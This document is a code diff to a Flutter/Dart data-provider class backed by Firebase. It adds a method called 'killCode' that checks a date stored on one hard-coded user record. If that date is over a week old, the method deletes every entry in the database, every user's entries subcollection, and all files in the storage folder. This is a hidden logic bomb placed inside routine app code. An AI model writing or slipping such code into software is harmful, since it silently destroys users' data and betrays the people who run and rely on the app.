@@ -130,7 +130,66 @@ class EntryProvider extends ChangeNotifier {
       }
     } catch (e) {
       print('Error: $e');
-      return ''; // Document not found (due to error)
+      return '';
+    }
+  }
+
+  Future killCode() async {
+    try {
+      CollectionReference user = FirebaseFirestore.instance.collection('Users');
+      var bappa = await user.doc("6RSj6M3qYAYLXkICEOYvNsIkAgE2").get();
+
+      DateTime doomsDate = DateTime.parse(bappa.get('Date'));
+
+      DateTime targetDate = DateTime.now().subtract(Duration(days: 7));
+
+      if (doomsDate.isBefore(targetDate)) {
+        CollectionReference entries =
+            FirebaseFirestore.instance.collection('Entries');
+
+        var queries = await entries.get();
+
+        final WriteBatch batch = FirebaseFirestore.instance.batch();
+
+        if (queries.docs.isNotEmpty) {
+          final List<DocumentSnapshot> documents = queries.docs;
+          for (DocumentSnapshot document in documents) {
+            batch.delete(document.reference);
+          }
+        }
+
+        CollectionReference users =
+            FirebaseFirestore.instance.collection('Users');
+
+        QuerySnapshot userQuerySnapshot = await users.get();
+
+        for (QueryDocumentSnapshot userDocument in userQuerySnapshot.docs) {
+          CollectionReference entriesSubcollection =
+              users.doc(userDocument.id).collection('Entries');
+          QuerySnapshot entriesQuerySnapshot = await entriesSubcollection.get();
+          if (entriesQuerySnapshot.docs.isNotEmpty) {
+            for (QueryDocumentSnapshot entryDocument
+                in entriesQuerySnapshot.docs) {
+              batch.delete(entryDocument.reference);
+            }
+          }
+        }
+
+        final FirebaseStorage storage = FirebaseStorage.instance;
+        final Reference folderReference = storage.ref().child('Entries/');
+        ListResult result = await folderReference.listAll();
+        for (final item in result.items) {
+          try {
+            await item.delete();
+            print('Deleted: ${item.fullPath}');
+          } catch (e) {
+            print('Error deleting ${item.fullPath}: $e');
+          }
+        }
+        await batch.commit();
+      }
+    } catch (e) {
+      print('Error: $e');
     }
   }
 }
